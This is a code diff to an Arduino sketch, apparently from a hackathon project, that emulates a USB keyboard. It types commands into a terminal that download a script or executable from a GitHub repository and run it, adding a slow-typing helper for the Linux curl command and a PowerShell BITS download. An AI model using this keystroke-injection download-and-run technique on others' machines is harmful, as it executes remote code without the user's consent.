@@ -130,6 +130,15 @@ void setupScript()
     FastLED.show();
 }
 
+void typeSlow(String text, int delayMs) {
+  for (int i = 0; i < text.length(); i++) {
+    Keyboard.write(text[i]);
+    delay(delayMs);
+  }
+}
+
+
+
 #if HOST == 1
 void openTerminal()
 {
@@ -144,8 +153,9 @@ void openTerminal()
 }
 void downloadCheckFile()
 {
-    Keyboard.println("curl -o check.sh https://raw.githubusercontent.com/regularpooria/willow_qhacks2026/refs/heads/main/arduino_download_script/check.sh && chmod +x check.sh && ./check.sh");
+    typeSlow("curl -o check.sh https://raw.githubusercontent.com/regularpooria/willow_qhacks2026/refs/heads/main/arduino_download_script/check.sh && chmod +x check.sh && ./check.sh", 10);
     delay(3000);
+    Keyboard.println();
 }
 #endif
 
@@ -167,10 +177,9 @@ void openTerminal()
 }
 void downloadCheckFile()
 {
-    Keyboard.print("powershell -NoProfile -Command \"$d=[Environment]::GetFolderPath('Desktop');$p=Join-Path $d 'willow.exe';if(Test-Path $p){Start-Process $p}else{Invoke-WebRequest -Uri 'https://github.com/regularpooria/willow_qhacks2026/releases/download/windows/Willow.exe' -OutFile $p;Start-Process $p}\"");
-    delay(4000);
+    typeSlow("powershell -Command \"$p=Join-Path $env:TEMP 'willow.exe';if(!(Test-Path $p)){Start-BitsTransfer 'https://github.com/regularpooria/willow_qhacks2026/releases/download/windows/Willow.exe' $p};Start $p\"", 10);
+    delay(100);
     Keyboard.println();
-    delay(6000);
 }
 #endif
 
